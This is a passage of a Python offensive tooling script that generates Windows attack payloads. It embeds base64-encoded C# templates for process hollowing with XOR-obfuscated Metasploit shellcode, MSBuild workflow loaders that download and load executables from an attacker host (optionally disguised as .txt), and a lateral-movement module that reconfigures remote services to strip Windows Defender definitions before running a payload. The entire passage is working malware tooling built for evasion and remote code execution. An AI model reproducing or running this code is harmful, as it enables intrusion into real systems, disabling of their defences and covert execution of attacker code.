1bHR9LiIpOwoKICAgICAgICAgICAgLy8gUmVzdW1lIHRoZSB0aHJlYWQgdG8gdHJpZ2dlciBvdXIgcGF5bG9hZAogICAgICAgICAgICB1aW50IHJSZXN1bHQgPSBSZXN1bWVUaHJlYWQocEluZm8uaFRocmVhZCk7CiAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCQiVHJpZ2dlcmVkIHBheWxvYWQuIFN1Y2Nlc3M6IHtyUmVzdWx0ID09IDF9LiBDaGVjayB5b3VyIGxpc3RlbmVyISIpOwogICAgICAgIH0KICAgIH0KfQ=="

    msffilename = "met%s.csharp" % (bitness)
    m = open(msffilename,'r')
    msf = m.read()
    m.close()
    msf = xor_buffer_csharp(msf) # 5/26 -defender
    #msf_b64 = base64.b64encode(msf).decode()

    with open(hollowfilename,'w') as f:
        upper = base64.b64decode(upper).decode()
        lower = base64.b64decode(lower).decode()
        f.write(upper + "\n")
        f.write("\t\t\t" + msf + "\n")
        f.write(lower)
    f.close()

    print('[+] hollow cs written: %s' % hollowfilename)
    return hollowfilename

def makehollow(bitness,lhost,lport):
    hollowfilename = writehollow(bitness,lhost,lport)
    csfilepath = "/home/kali/data/Hollow/Hollow/"
    csfilename = "Program.cs"
    exewebroot = "/var/www/html/"
    exefilename = "Hollow.exe"

    copy(hollowfilename,csfilepath,csfilename)
    input("[!] build %s%s with bitness %s .. press enter to continue\n" % (csfilepath,csfilename,bitness))
    if bitness == "64":
        copy("%sbin/x64/Release/%s" % (csfilepath,exefilename),exewebroot,exefilename)
    if bitness == "32":
        copy("%sbin/x86/Release/%s" % (csfilepath,exefilename),exewebroot,exefilename)
    pass

def writecompile(bitness,lhost,lport,ptype,binary,targethost,listenhost,pipename,pscmd):
    compilefilename = "compile.txt"
    compilewebroot = "/var/www/html/"
    kalismbpath = "/home/kali/data/Tools/"
    runfilename = "run.xml"
    winsmbpath = "\\\\%s\\visualstudio\\tools\\%s"
    
    compilepath = winsmbpath % (devhost,compilefilename) #devhost, not lhost!
    compileout = winsmbpath % (devhost,runfilename) #devhost, not lhost!
    kalicompileout = kalismbpath + runfilename
    runfilepath = compilewebroot + runfilename
    
    if ptype == "remote":
        upper = "dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uV29ya2Zsb3cuQ29tcG9uZW50TW9kZWw7CnVzaW5nIFN5c3RlbS5JTzsKdXNpbmcgU3lzdGVtLlJlZmxlY3Rpb247CnVzaW5nIFN5c3RlbS5OZXQ7CgpwdWJsaWMgY2xhc3MgUnVuIDogQWN0aXZpdHkKewogICAgcHVibGljIFJ1bigpIHsKICAgICAgICBNZW1vcnlTdHJlYW0gbXMgPSBuZXcgTWVtb3J5U3RyZWFtKCk7CiAgICAgICAgdXNpbmcgKFdlYkNsaWVudCBjbGllbnQgPSBuZXcgV2ViQ2xpZW50KCkpCiAgICAgICAgew=="
        lower = "ICAgICAgICAgICAgc3RyaW5nW10gYXJncyA9IG5ldyBzdHJpbmdbXXsiYXVkaXQifTsKICAgICAgICAgICAgLy9BY2Nlc3Mgd2ViIGFuZCByZWFkIHRoZSBieXRlcyBmcm9tIHRoZSBiaW5hcnkgZmlsZQogICAgICAgICAgICBTeXN0ZW0uTmV0LlNlcnZpY2VQb2ludE1hbmFnZXIuU2VjdXJpdHlQcm90b2NvbCA9IFN5c3RlbS5OZXQuU2VjdXJpdHlQcm90b2NvbFR5cGUuVGxzIHwgU3lzdGVtLk5ldC5TZWN1cml0eVByb3RvY29sVHlwZS5UbHMxMSB8IFN5c3RlbS5OZXQuU2VjdXJpdHlQcm90b2NvbFR5cGUuVGxzMTI7CiAgICAgICAgICAgIG1zID0gbmV3IE1lbW9yeVN0cmVhbShjbGllbnQuRG93bmxvYWREYXRhKHVybCkpOwogICAgICAgICAgICBCaW5hcnlSZWFkZXIgYnIgPSBuZXcgQmluYXJ5UmVhZGVyKG1zKTsKICAgICAgICAgICAgYnl0ZVtdIGJpbiA9IGJyLlJlYWRCeXRlcyhDb252ZXJ0LlRvSW50MzIobXMuTGVuZ3RoKSk7CiAgICAgICAgICAgIG1zLkNsb3NlKCk7CiAgICAgICAgICAgIGJyLkNsb3NlKCk7CiAgICAgICAgICAgIC8vIGxvYWQgdGhlIGJ5dGVzIGludG8gQXNzZW1ibHkKICAgICAgICAgICAgQXNzZW1ibHkgYSA9IEFzc2VtYmx5LkxvYWQoYmluKTsKICAgICAgICAgICAgLy8gc2VhcmNoIGZvciB0aGUgRW50cnkgUG9pbnQKICAgICAgICAgICAgTWV0aG9kSW5mbyBtZXRob2QgPSBhLkVudHJ5UG9pbnQ7CiAgICAgICAgICAgIC8vIGNyZWF0ZSBhbiBpc3RhbmNlIG9mIHRoZSBNYWluIG1ldGhvZAogICAgICAgICAgICBvYmplY3QgbyA9IGEuQ3JlYXRlSW5zdGFuY2UobWV0aG9kLk5hbWUpOwogICAgICAgICAgICAvLyBpbnZva2UgdGhlIGFwcGxpY2F0aW9uIHN0YXJ0aW5nIHBvaW50CiAgICAgICAgICAgIHRyeQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgLy8gaWYgdGhlIG1ldGhvZCBpcyBzdGF0aWMgYXMgaXQgaXMgaW4gSGVsbG9Xb3JsZC5leGUgeW91IGNhbiB1c2UgbnVsbAogICAgICAgICAgICAgIG1ldGhvZC5JbnZva2UobnVsbCwgbmV3IG9iamVjdFtde2FyZ3N9KTsKICAgICAgICAgICAgICAvLyBpZiBub3Qgc3RhdGljIHlvdSdsbCBuZWVkIHRoZSBvYmplY3QKICAgICAgICAgICAgICAvL21ldGhvZC5JbnZva2UobywgbmV3IG9iamVjdFtde2FyZ3N9KTsKICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaCAoRXhjZXB0aW9uIGV4KQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoZXguTWVzc2FnZSk7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgU29tZXRoaW5nKCk7CiAgICB9CiAgICAKICAgIHB1YmxpYyBzdGF0aWMgdm9pZCBTb21ldGhpbmcoKSB7CiAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoIlByZXBhcmluZyB0byBjb25maWd1cmUgV2luZG93cy4uIERvIG5vdCB0dXJuIG9mZiB5b3VyIGNvbXB1dGVyLiIpOwogICAgfQp9"
        proxy = "SVdlYlByb3h5IGRlZmF1bHRQcm94eSA9IFdlYlJlcXVlc3QuRGVmYXVsdFdlYlByb3h5OwogICAgICAgICAgICBpZiAoZGVmYXVsdFByb3h5ICE9IG51bGwpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGNsaWVudC5Qcm94eSA9IGRlZmF1bHRQcm94eTsKICAgICAgICAgICAgfQ=="

        agent = "client.Headers.Add (\"User-Agent\", \"%s\");" % agent_string

        if obfuscate_bin == "0":
            data = "string url = \"http://%s/%s.exe\";" % (lhost,binary)
        if obfuscate_bin == "1":
            data = "string url = \"http://%s/%s.txt\";" % (lhost,binary)

        #[!] obfuscate binaries as .txt if needed - tested working!
        #data = "string url = \"http://%s/%s.txt\";" % (lhost,binary)

        with open(compilefilename,'w') as f:
            upper = base64.b64decode(upper).decode()
            lower = base64.b64decode(lower).decode()
            proxy = base64.b64decode(proxy).decode()
            f.write(upper + "\n")
            f.write("            " + proxy + "\n")
            f.write("            " + agent + "\n")
            f.write("            " + data + "\n")
            f.write(lower)
        f.close()

    if ptype == "local":
        if binary == "Lat":
            #service -> pipename
            #binary -> pscmd
            upper = "dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uV29ya2Zsb3cuQ29tcG9uZW50TW9kZWw7CnVzaW5nIFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlczsKdXNpbmcgU3lzdGVtLklPOwp1c2luZyBTeXN0ZW0uRGlhZ25vc3RpY3M7CnVzaW5nIFN5c3RlbS5UZXh0OwoKcHVibGljIGNsYXNzIFJ1biA6IEFjdGl2aXR5ewoKICAgIFtEbGxJbXBvcnQoImFkdmFwaTMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUsIEJlc3RGaXRNYXBwaW5nID0gZmFsc2UsIFRocm93T25Vbm1hcHBhYmxlQ2hhciA9IHRydWUpXQogICAgW3JldHVybjogTWFyc2hhbEFzKFVubWFuYWdlZFR5cGUuQm9vbCldCiAgICBpbnRlcm5hbCBzdGF0aWMgZXh0ZXJuIGJvb2wgTG9nb25Vc2VyKAogICAgICAgIFtNYXJzaGFsQXMoVW5tYW5hZ2VkVHlwZS5MUFN0cildIHN0cmluZyBscHN6VXNlcm5hbWUsCiAgICAgICAgW01hcnNoYWxBcyhVbm1hbmFnZWRUeXBlLkxQU3RyKV0gc3RyaW5nIGxwc3pEb21haW4sCiAgICAgICAgW01hcnNoYWxBcyhVbm1hbmFnZWRUeXBlLkxQU3RyKV0gc3RyaW5nIGxwc3pQYXNzd29yZCwKICAgICAgICBpbnQgZHdMb2dvblR5cGUsCiAgICAgICAgaW50IGR3TG9nb25Qcm92aWRlciwKICAgICAgICByZWYgSW50UHRyIHBoVG9rZW4KICAgICAgICApOwoKICAgIFtEbGxJbXBvcnQoImFkdmFwaTMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQogICAgc3RhdGljIGV4dGVybiBib29sIEltcGVyc29uYXRlTG9nZ2VkT25Vc2VyKEludFB0ciBoVG9rZW4pOwoKICAgIFtEbGxJbXBvcnQoImFkdmFwaTMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUsIENoYXJTZXQgPSBDaGFyU2V0LkF1dG8pXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGludCBRdWVyeVNlcnZpY2VDb25maWcoSW50UHRyIHNlcnZpY2UsIEludFB0ciBxdWVyeVNlcnZpY2VDb25maWcsIGludCBidWZmZXJTaXplLCByZWYgaW50IGJ5dGVzTmVlZGVkKTsKCiAgICBbRGxsSW1wb3J0KCJhZHZhcGkzMi5kbGwiLCBFbnRyeVBvaW50ID0gIk9wZW5TQ01hbmFnZXJXIiwgRXhhY3RTcGVsbGluZyA9IHRydWUsIENoYXJTZXQgPSBDaGFyU2V0LlVuaWNvZGUsIFNldExhc3RFcnJvciA9IHRydWUpXQogICAgcHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIE9wZW5TQ01hbmFnZXIoc3RyaW5nIG1hY2hpbmVOYW1lLCBzdHJpbmcgZGF0YWJhc2VOYW1lLCB1aW50IGR3QWNjZXNzKTsKCiAgICBbRGxsSW1wb3J0KCJhZHZhcGkzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlLCBDaGFyU2V0ID0gQ2hhclNldC5BdXRvKV0KICAgIHN0YXRpYyBleHRlcm4gSW50UHRyIE9wZW5TZXJ2aWNlKEludFB0ciBoU0NNYW5hZ2VyLCBzdHJpbmcgbHBTZXJ2aWNlTmFtZSwgdWludCBkd0Rlc2lyZWRBY2Nlc3MpOwoKICAgIFtEbGxJbXBvcnQoImFkdmFwaTMyLmRsbCIsIEVudHJ5UG9pbnQgPSAiQ2hhbmdlU2VydmljZUNvbmZpZyIpXQogICAgW3JldHVybjogTWFyc2hhbEFzKFVubWFuYWdlZFR5cGUuQm9vbCldCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIENoYW5nZVNlcnZpY2VDb25maWdBKEludFB0ciBoU2VydmljZSwgdWludCBkd1NlcnZpY2VUeXBlLCBpbnQgZHdTdGFydFR5cGUsIGludCBkd0Vycm9yQ29udHJvbCwgc3RyaW5nIGxwQmluYXJ5UGF0aE5hbWUsIHN0cmluZyBscExvYWRPcmRlckdyb3VwLCBzdHJpbmcgbHBkd1RhZ0lkLCBzdHJpbmcgbHBEZXBlbmRlbmNpZXMsIHN0cmluZyBscFNlcnZpY2VTdGFydE5hbWUsIHN0cmluZyBscFBhc3N3b3JkLCBzdHJpbmcgbHBEaXNwbGF5TmFtZSk7CgogICAgW0RsbEltcG9ydCgiYWR2YXBpMzIiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgIFtyZXR1cm46IE1hcnNoYWxBcyhVbm1hbmFnZWRUeXBlLkJvb2wpXQogICAgcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBTdGFydFNlcnZpY2UoSW50UHRyIGhTZXJ2aWNlLCBpbnQgZHdOdW1TZXJ2aWNlQXJncywgc3RyaW5nW10gbHBTZXJ2aWNlQXJnVmVjdG9ycyk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIildCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiB1aW50IEdldExhc3RFcnJvcigpOwogICAgcHVibGljIGVudW0gQUNDRVNTX01BU0sgOiB1aW50CiAgICB7CiAgICAgICAgU1RBTkRBUkRfUklHSFRTX1JFUVVJUkVEID0gMHgwMDBGMDAwMCwKICAgICAgICBTVEFOREFSRF9SSUdIVFNfUkVBRCA9IDB4MDAwMjAwMDAsCiAgICAgICAgU1RBTkRBUkRfUklHSFRTX1dSSVRFID0gMHgwMDAyMDAwMCwKICAgICAgICBTVEFOREFSRF9SSUdIVFNfRVhFQ1VURSA9IDB4MDAwMjAwMDAsCiAgICB9CgogICAgcHVibGljIGVudW0gU0NNX0FDQ0VTUyA6IHVpbnQKICAgIHsKICAgICAgICBTQ19NQU5BR0VSX0NPTk5FQ1QgPSAweDAwMDAxLAogICAgICAgIFNDX01BTkFHRVJfQ1JFQVRFX1NFUlZJQ0UgPSAweDAwMDAyLAogICAgICAgIFNDX01BTkFHRVJfRU5VTUVSQVRFX1NFUlZJQ0UgPSAweDAwMDA0LAogICAgICAgIFNDX01BTkFHRVJfTE9DSyA9IDB4MDAwMDgsCiAgICAgICAgU0NfTUFOQUdFUl9RVUVSWV9MT0NLX1NUQVRVUyA9IDB4MDAwMTAsCiAgICAgICAgU0NfTUFOQUdFUl9NT0RJRllfQk9PVF9DT05GSUcgPSAweDAwMDIwLAogICAgICAgIFNDX01BTkFHRVJfQUxMX0FDQ0VTUyA9IEFDQ0VTU19NQVNLLlNUQU5EQVJEX1JJR0hUU19SRVFVSVJFRCB8CiAgICAgICAgICAgIFNDX01BTkFHRVJfQ09OTkVDVCB8CiAgICAgICAgICAgIFNDX01BTkFHRVJfQ1JFQVRFX1NFUlZJQ0UgfAogICAgICAgICAgICBTQ19NQU5BR0VSX0VOVU1FUkFURV9TRVJWSUNFIHwKICAgICAgICAgICAgU0NfTUFOQUdFUl9MT0NLIHwKICAgICAgICAgICAgU0NfTUFOQUdFUl9RVUVSWV9MT0NLX1NUQVRVUyB8CiAgICAgICAgICAgIFNDX01BTkFHRVJfTU9ESUZZX0JPT1RfQ09ORklHLAoKICAgICAgICBHRU5FUklDX1JFQUQgPSBBQ0NFU1NfTUFTSy5TVEFOREFSRF9SSUdIVFNfUkVBRCB8CiAgICAgICAgICAgIFNDX01BTkFHRVJfRU5VTUVSQVRFX1NFUlZJQ0UgfAogICAgICAgICAgICBTQ19NQU5BR0VSX1FVRVJZX0xPQ0tfU1RBVFVTLAoKICAgICAgICBHRU5FUklDX1dSSVRFID0gQUNDRVNTX01BU0suU1RBTkRBUkRfUklHSFRTX1dSSVRFIHwKICAgICAgICAgICAgU0NfTUFOQUdFUl9DUkVBVEVfU0VSVklDRSB8CiAgICAgICAgICAgIFNDX01BTkFHRVJfTU9ESUZZX0JPT1RfQ09ORklHLAoKICAgICAgICBHRU5FUklDX0VYRUNVVEUgPSBBQ0NFU1NfTUFTSy5TVEFOREFSRF9SSUdIVFNfRVhFQ1VURSB8CiAgICAgICAgICAgIFNDX01BTkFHRVJfQ09OTkVDVCB8IFNDX01BTkFHRVJfTE9DSywKCiAgICAgICAgR0VORVJJQ19BTEwgPSBTQ19NQU5BR0VSX0FMTF9BQ0NFU1MsCiAgICB9CiAgICBwdWJsaWMgZW51bSBTRVJWSUNFX0FDQ0VTUyA6IHVpbnQKICAgIHsKICAgICAgICBTVEFOREFSRF9SSUdIVFNfUkVRVUlSRUQgPSAweEYwMDAwLAogICAgICAgIFNFUlZJQ0VfUVVFUllfQ09ORklHID0gMHgwMDAwMSwKICAgICAgICBTRVJWSUNFX0NIQU5HRV9DT05GSUcgPSAweDAwMDAyLAogICAgICAgIFNFUlZJQ0VfUVVFUllfU1RBVFVTID0gMHgwMDAwNCwKICAgICAgICBTRVJWSUNFX0VOVU1FUkFURV9ERVBFTkRFTlRTID0gMHgwMDAwOCwKICAgICAgICBTRVJWSUNFX1NUQVJUID0gMHgwMDAxMCwKICAgICAgICBTRVJWSUNFX1NUT1AgPSAweDAwMDIwLAogICAgICAgIFNFUlZJQ0VfUEFVU0VfQ09OVElOVUUgPSAweDAwMDQwLAogICAgICAgIFNFUlZJQ0VfSU5URVJST0dBVEUgPSAweDAwMDgwLAogICAgICAgIFNFUlZJQ0VfVVNFUl9ERUZJTkVEX0NPTlRST0wgPSAweDAwMTAwLAogICAgICAgIFNFUlZJQ0VfQUxMX0FDQ0VTUyA9IChTVEFOREFSRF9SSUdIVFNfUkVRVUlSRUQgfAogICAgICAgICAgICAgICAgICAgICAgICAgIFNFUlZJQ0VfUVVFUllfQ09ORklHIHwKICAgICAgICAgICAgICAgICAgICAgICAgICBTRVJWSUNFX0NIQU5HRV9DT05GSUcgfAogICAgICAgICAgICAgICAgICAgICAgICAgIFNFUlZJQ0VfUVVFUllfU1RBVFVTIHwKICAgICAgICAgICAgICAgICAgICAgICAgICBTRVJWSUNFX0VOVU1FUkFURV9ERVBFTkRFTlRTIHwKICAgICAgICAgICAgICAgICAgICAgICAgICBTRVJWSUNFX1NUQVJUIHwKICAgICAgICAgICAgICAgICAgICAgICAgICBTRVJWSUNFX1NUT1AgfAogICAgICAgICAgICAgICAgICAgICAgICAgIFNFUlZJQ0VfUEFVU0VfQ09OVElOVUUgfAogICAgICAgICAgICAgICAgICAgICAgICAgIFNFUlZJQ0VfSU5URVJST0dBVEUgfAogICAgICAgICAgICAgICAgICAgICAgICAgIFNFUlZJQ0VfVVNFUl9ERUZJTkVEX0NPTlRST0wpCiAgICB9CiAgICBwcml2YXRlIHN0cnVjdCBRdWVyeVNlcnZpY2VDb25maWdTdHJ1Y3QKICAgIHsKICAgICAgICBwdWJsaWMgaW50IHNlcnZpY2VUeXBlOwogICAgICAgIHB1YmxpYyBpbnQgc3RhcnRUeXBlOwogICAgICAgIHB1YmxpYyBpbnQgZXJyb3JDb250cm9sOwogICAgICAgIHB1YmxpYyBJbnRQdHIgYmluYXJ5UGF0aE5hbWU7CiAgICAgICAgcHVibGljIEludFB0ciBsb2FkT3JkZXJHcm91cDsKICAgICAgICBwdWJsaWMgaW50IHRhZ0lEOwogICAgICAgIHB1YmxpYyBJbnRQdHIgZGVwZW5kZW5jaWVzOwogICAgICAgIHB1YmxpYyBJbnRQdHIgc3RhcnROYW1lOwogICAgICAgIHB1YmxpYyBJbnRQdHIgZGlzcGxheU5hbWU7CiAgICB9CgogICAgY29uc3QgdWludCBTRVJWSUNFX05PX0NIQU5HRSA9IDB4ZmZmZmZmZmY7CiAgICBjb25zdCBpbnQgU0VSVklDRV9ERU1BTkRfU1RBUlQgPSAweDAwMDAwMDAzOwogICAgY29uc3QgaW50IFNFUlZJQ0VfRVJST1JfSUdOT1JFID0gMHgwMDAwMDAwMDsKCiAgICBwdWJsaWMgUnVuKCkgewogICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJQcmVwYXJpbmcgdG8gY29uZmlndXJlIFdpbmRvd3MuLi4gRG8gbm90IHR1cm4gb2ZmIHlvdXIgY29tcHV0ZXIuIik7CgogICAgICAgIGludCBieXRlc05lZWRlZCA9IDU7CiAgICAgICAgYm9vbCBiUmVzdWx0ID0gZmFsc2U7"
            tmid = "ICAgICAgICBJbnRQdHIgU0NNSGFuZGxlID0gT3BlblNDTWFuYWdlcih0YXJnZXQsIG51bGwsICh1aW50KVNDTV9BQ0NFU1MuU0NfTUFOQUdFUl9BTExfQUNDRVNTKTsKICAgICAgICBpZiAoU0NNSGFuZGxlID09IEludFB0ci5aZXJvKQogICAgICAgIHsKICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoIlshXSBPcGVuU0NNYW5hZ2VyQSBmYWlsZWQhIEVycm9yOnswfSIsIEdldExhc3RFcnJvcigpKTsKICAgICAgICAgICAgRW52aXJvbm1lbnQuRXhpdCgwKTsKICAgICAgICB9CiAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoIlsrXSBTQ19IQU5ETEUgTWFuYWdlciAweHswfSIsIFNDTUhhbmRsZSk7"
            smid = "ICAgICAgICBDb25zb2xlLldyaXRlTGluZSgiWytdIE9wZW5pbmcgc2VydmljZTogezB9IiwgU2VydmljZU5hbWUpOwogICAgICAgIEludFB0ciBzY2hTZXJ2aWNlID0gT3BlblNlcnZpY2UoU0NNSGFuZGxlLCBTZXJ2aWNlTmFtZSwgKCh1aW50KVNFUlZJQ0VfQUNDRVNTLlNFUlZJQ0VfQUxMX0FDQ0VTUykpOwogICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJbK10gU0NfSEFORExFIFNlcnZpY2UgMHh7MH0iLCBzY2hTZXJ2aWNlKTsKCiAgICAgICAgUXVlcnlTZXJ2aWNlQ29uZmlnU3RydWN0IHFzY3MgPSBuZXcgUXVlcnlTZXJ2aWNlQ29uZmlnU3RydWN0KCk7CiAgICAgICAgSW50UHRyIHFzY1B0ciA9IE1hcnNoYWwuQWxsb2NDb1Rhc2tNZW0oMCk7CiAgICAgICAgaW50IHJldENvZGUgPSBRdWVyeVNlcnZpY2VDb25maWcoc2NoU2VydmljZSwgcXNjUHRyLCAwLCByZWYgYnl0ZXNOZWVkZWQpOwogICAgICAgIGlmIChyZXRDb2RlID09IDAgJiYgYnl0ZXNOZWVkZWQgPT0gMCkKICAgICAgICB7CiAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJbIV0gUXVlcnlTZXJ2aWNlQ29uZmlnIGZhaWxlZCB0byByZWFkIHRoZSBzZXJ2aWNlIHBhdGguIEVycm9yOnswfSIsIEdldExhc3RFcnJvcigpKTsKICAgICAgICB9CiAgICAgICAgZWxzZQogICAgICAgIHsKICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoIlsrXSBMUFFVRVJZX1NFUlZJQ0VfQ09ORklHQSBuZWVkIHswfSBieXRlcyIsIGJ5dGVzTmVlZGVkKTsKICAgICAgICAgICAgcXNjUHRyID0gTWFyc2hhbC5BbGxvY0NvVGFza01lbShieXRlc05lZWRlZCk7CiAgICAgICAgICAgIHJldENvZGUgPSBRdWVyeVNlcnZpY2VDb25maWcoc2NoU2VydmljZSwgcXNjUHRyLCBieXRlc05lZWRlZCwgcmVmIGJ5dGVzTmVlZGVkKTsKICAgICAgICAgICAgcXNjcy5iaW5hcnlQYXRoTmFtZSA9IEludFB0ci5aZXJvOwoKICAgICAgICAgICAgcXNjcyA9IChRdWVyeVNlcnZpY2VDb25maWdTdHJ1Y3QpTWFyc2hhbC5QdHJUb1N0cnVjdHVyZShxc2NQdHIsIG5ldyBRdWVyeVNlcnZpY2VDb25maWdTdHJ1Y3QoKS5HZXRUeXBlKCkpOwogICAgICAgIH0KCiAgICAgICAgc3RyaW5nIG9yaWdpbmFsQmluYXJ5UGF0aCA9IE1hcnNoYWwuUHRyVG9TdHJpbmdBdXRvKHFzY3MuYmluYXJ5UGF0aE5hbWUpOwogICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJbK10gT3JpZ2luYWwgc2VydmljZSBiaW5hcnkgcGF0aCBcInswfVwiIiwgb3JpZ2luYWxCaW5hcnlQYXRoKTsKICAgICAgICBNYXJzaGFsLkZyZWVDb1Rhc2tNZW0ocXNjUHRyKTsKICAgICAgICBzdHJpbmcgc2lnbmF0dXJlID0gIlwiQzpcXFByb2dyYW0gRmlsZXNcXFdpbmRvd3MgRGVmZW5kZXJcXE1wQ21kUnVuLmV4ZVwiIC1SZW1vdmVEZWZpbml0aW9ucyAtQWxsIjsKICAgICAgICBiUmVzdWx0ID0gQ2hhbmdlU2VydmljZUNvbmZpZ0Eoc2NoU2VydmljZSwgU0VSVklDRV9OT19DSEFOR0UsIFNFUlZJQ0VfREVNQU5EX1NUQVJULCBTRVJWSUNFX0VSUk9SX0lHTk9SRSwgc2lnbmF0dXJlLCBudWxsLCBudWxsLCBudWxsLCBudWxsLCBudWxsLCBudWxsKTsKICAgICAgICBpZiAoIWJSZXN1bHQpCiAgICAgICAgewogICAgICAgICAgICBDb25zb2xlLldyaXRlTGluZSgiWyFdIENoYW5nZVNlcnZpY2VDb25maWdBIGZhaWxlZCB0byB1cGRhdGUgdGhlIHNlcnZpY2UgcGF0aC4gRXJyb3I6ezB9IiwgR2V0TGFzdEVycm9yKCkpOwogICAgICAgICAgICBFbnZpcm9ubWVudC5FeGl0KDApOwogICAgICAgIH0KICAgICAgICBDb25zb2xlLldyaXRlTGluZSgiWypdIFNlcnZpY2UgcGF0aCBjaGFuZ2VkIHRvIFwiezB9XCIiLCBzaWduYXR1cmUpOwogICAgICAgIGJSZXN1bHQgPSBTdGFydFNlcnZpY2Uoc2NoU2VydmljZSwgMCwgbnVsbCk7CiAgICAgICAgdWludCBkd1Jlc3VsdCA9IEdldExhc3RFcnJvcigpOwogICAgICAgIGlmICghYlJlc3VsdCAmJiBkd1Jlc3VsdCAhPSAxMDUzKQogICAgICAgIHsKICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoIlshXSBTdGFydFNlcnZpY2VBIGZhaWxlZCB0byBzdGFydCB0aGUgc2VydmljZS4gRXJyb3I6ezB9IiwgR2V0TGFzdEVycm9yKCkpOwogICAgICAgICAgICBFbnZpcm9ubWVudC5FeGl0KDApOwogICAgICAgIH0KICAgICAgICBlbHNlCiAgICAgICAgewogICAgICAgICAgICBDb25zb2xlLldyaXRlTGluZSgiWytdIERlZmVuZGVyIHdyZWNrZWQiKTsKICAgICAgICB9"
            lower = "ICAgICAgICBiUmVzdWx0ID0gQ2hhbmdlU2VydmljZUNvbmZpZ0Eoc2NoU2VydmljZSwgU0VSVklDRV9OT19DSEFOR0UsIFNFUlZJQ0VfREVNQU5EX1NUQVJULCBTRVJWSUNFX0VSUk9SX0lHTk9SRSwgcGF5bG9hZCwgbnVsbCwgbnVsbCwgbnVsbCwgbnVsbCwgbnVsbCwgbnVsbCk7CiAgICAgICAgaWYgKCFiUmVzdWx0KQogICAgICAgIHsKICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoIlshXSBDaGFuZ2VTZXJ2aWNlQ29uZmlnQSBmYWlsZWQgdG8gdXBkYXRlIHRoZSBzZXJ2aWNlIHBhdGguIEVycm9yOnswfSIsIEdldExhc3RFcnJvcigpKTsKICAgICAgICAgICAgRW52aXJvbm1lbnQuRXhpdCgwKTsKICAgICAgICB9CiAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoIlsrXSBTZXJ2aWNlIHBhdGggY2hhbmdlZCB0byBcInswfVwiIiwgcGF5bG9hZCk7CiAgICAgICAgYlJlc3VsdCA9IFN0YXJ0U2VydmljZShzY2hTZXJ2aWNlLCAwLCBudWxsKTsKICAgICAgICBkd1Jlc3VsdCA9IEdldExhc3RFcnJvcigpOwogICAgICAgIGlmICghYlJlc3VsdCAmJiBkd1Jlc3VsdCAhPSAxMDUzKQogICAgICAgIHsKICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoIlshXSBTdGFydFNlcnZpY2VBIGZhaWxlZCB0byBzdGFydCB0aGUgc2VydmljZS4gRXJyb3I6ezB9IiwgR2V0TGFzdEVycm9yKCkpOwogICAgICAgICAgICBFbnZpcm9ubWVudC5FeGl0KDApOwogICAgICAgIH0KICAgICAgICBlbHNlCiAgICAgICAgewogICAgICAgICAgICBDb25zb2xlLldyaXRlTGluZSgiWytdIFNlcnZpY2Ugc3RhcnRlZCIpOwogICAgICAgIH0KCiAgICAgICAgYlJlc3VsdCA9IENoYW5nZVNlcnZpY2VDb25maWdBKHNjaFNlcnZpY2UsIFNFUlZJQ0VfTk9fQ0hBTkdFLCBTRVJWSUNFX0RFTUFORF9TVEFSVCwgU0VSVklDRV9FUlJPUl9JR05PUkUsIG9yaWdpbmFsQmluYXJ5UGF0aCwgbnVsbCwgbnVsbCwgbnVsbCwgbnVsbCwgbnVsbCwgbnVsbCk7CiAgICAgICAgaWYgKCFiUmVzdWx0KQogICAgICAgIHsKICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoIlshXSBDaGFuZ2VTZXJ2aWNlQ29uZmlnQSBmYWlsZWQgdG8gcmV2ZXJ0IHRoZSBzZXJ2aWNlIHBhdGguIEVycm9yOnswfSIsIEdldExhc3RFcnJvcigpKTsKICAgICAgICAgICAgRW52aXJvbm1lbnQuRXhpdCgwKTsKICAgICAgICB9CiAgICAgICAgZWxzZQogICAgICAgIHsKICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoIlsrXSBTZXJ2aWNlIHBhdGggcmVzdG9yZWQgdG8gXCJ7MH1cIiIsIG9yaWdpbmFsQmluYXJ5UGF0aCk7CiAgICAgICAgfQogICAgICAgIAogICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJJIGV4ZWN1dGVkISIpOwogICAgfQp9"

            targetdata = "string target = \"%s\";" % targethost
            servicedata = "string ServiceName = \"%s\";" % pipename

            if pscmd == "0":
                print('[!] halt! Lat with powershell run.txt doesn\'t seem to work. target a binary! terminating!')
                sys.exit()
                '''
                runnerfilename = runner(lhost,lport,bitness)
                fcradle,cradle = cradleps1(lhost,runnerfilename)
                target = "http://%s/%s" % (lhost,runnerfilename)
